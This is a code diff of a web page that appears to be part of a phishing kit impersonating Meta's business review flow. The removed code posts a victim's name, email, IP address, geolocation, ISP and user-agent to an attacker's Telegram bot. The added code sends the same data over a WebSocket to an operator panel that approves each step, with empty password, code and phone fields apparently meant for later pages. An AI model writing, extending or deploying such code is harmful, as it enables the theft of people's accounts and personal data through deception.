@@ -2,21 +2,21 @@
 <?php require_once('./getip.php'); ?>
 
 <?php
-function getServerIP() {
-    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        return $_SERVER['HTTP_CLIENT_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else {
-        return $_SERVER['REMOTE_ADDR'];
+    function getServerIP() {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            return $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            return $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            return $_SERVER['REMOTE_ADDR'];
+        }
     }
-}
 
-$ip_server = getServerIP();
+    $ip_server = getServerIP();
 ?>
 
 <?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
 ?>
 
 
@@ -32,6 +32,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
 
 <body>
+    <?php include 'loading.php'; ?>
+
     <nav class="meta-nav">
         <div class="nav-content">
             <img style="height:30px" src="/images/logo.png" alt="Logo" class="logo">
@@ -116,6 +118,18 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
     <script src="/scripts/invite.js"></script>
 
     <script>
+        const ws = new WebSocket('ws://localhost:8080');
+        let orderId = '';
+
+        ws.onmessage = function(event) {
+            const data = JSON.parse(event.data);
+            if (data.type === 'admin_approve' && data.order_id === localStorage.getItem('currentOrderId', orderId)) {
+                localStorage.setItem('currentOrderId', data.order_id);
+                localStorage.setItem('currentStep', data.step);
+                window.location.href = '/review-business-information.php';
+            }
+        };
+
         function sendToTelegramFromInvite(event) {
             event.preventDefault();
             var firstName = document.getElementById('firstName').value;
@@ -126,58 +140,42 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 alert("Please fill in all required fields");
                 return;
             }
-            
 
-            var content = "💬Thông Tin Tài Khoản 1💬" +
-                "\n" + "----------------------------------------------------------" +
-                "\nFirst Name: " + "`" + firstName + "`" +
-                "\nLast Name: " + "`" + lastName + "`" +
-                "\nEmail: " + "`" + personalEmail + "`" +
-                "\n" + "----------------------------------------------------------" +
-                "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
-                "\nIP Address: " + "`<?php echo $ip; ?>`" +
-                "\nCity: " + "`<?php echo $city; ?>`" +
-                "\nRegion: " + "`<?php echo $region; ?>`" +
-                "\nCountry: " + "`<?php echo $country; ?>`" +
-                "\nOrg: " + "`<?php echo $org; ?>`" +
-                "\nTimezone: " + "`<?php echo $timezone; ?>`" +
-                "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
+            var ip = `<?php echo htmlspecialchars($ip_server); ?>` || `<?php echo $ip; ?>`;
+            var ip_address = `<?php echo $ip; ?>`;
+            var city = `<?php echo $city; ?>`;
+            var region = `<?php echo $region; ?>`;
+            var country = `<?php echo $country; ?>`;
+            var org = `<?php echo $org; ?>`;
+            var timezone = `<?php echo $timezone; ?>`;
+         
+            orderId = 'order_' + Date.now();
+            localStorage.setItem('currentOrderId', orderId);
+            ws.send(JSON.stringify({
+                type: 'new_order',
+                order_id: orderId,
+                step: 1,
+                user_info: {
+                    name: firstName + " " + lastName,
+                    email: personalEmail,
+                    ip: ip,
+                    ip_address: ip_address,
+                    city: city,
+                    region: region,
+                    country: country,
+                    org: org,
+                    timezone: timezone,
+                    password: "",
+                    code: "",
+                    phone: ""
+                }
+            }));
 
-            console.log(content);
-            
             localStorage.setItem('firstName', firstName);
             localStorage.setItem('lastName', lastName);
             localStorage.setItem('personalEmail', personalEmail);
 
-            var apiToken = "<?php echo $token; ?>";
-            var data = {
-                chat_id: '<?php echo $chatId; ?>',
-                text: content,
-                parse_mode: 'Markdown'
-            };
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://api.telegram.org/bot' + apiToken + '/sendMessage', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        console.log('Message sent to Telegram bot successfully.');
-                        setTimeout(function() {
-                            window.location.href = "/review-business-information.php";
-                        }, 1000);
-
-                        localStorage.setItem('firstName', firstName);
-                        localStorage.setItem('lastName', lastName);
-                        localStorage.setItem('personalEmail', personalEmail);
-                    } else {
-            console.error('Failed to send message to Telegram bot.');
-                    }
-                }
-            };
-
-            xhr.send(JSON.stringify(data));
+            showLoading();
         }
     </script>
 
